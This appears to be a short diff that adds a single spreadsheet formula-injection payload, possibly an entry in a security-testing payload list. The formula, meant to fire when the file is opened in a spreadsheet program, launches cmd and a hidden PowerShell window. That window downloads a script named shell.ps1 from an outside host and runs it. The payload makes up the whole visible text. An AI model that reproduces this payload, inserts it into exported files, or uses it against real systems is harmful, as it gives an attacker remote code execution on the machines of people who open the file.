@@ -1,0 +1,3 @@
+=cmd|'/c powershell.exe -w hidden $e=(New-Object
+System.Net.WebClient).DownloadString(
+"http://bishopfox.com/shell.ps1");powershell -e $e'!A1
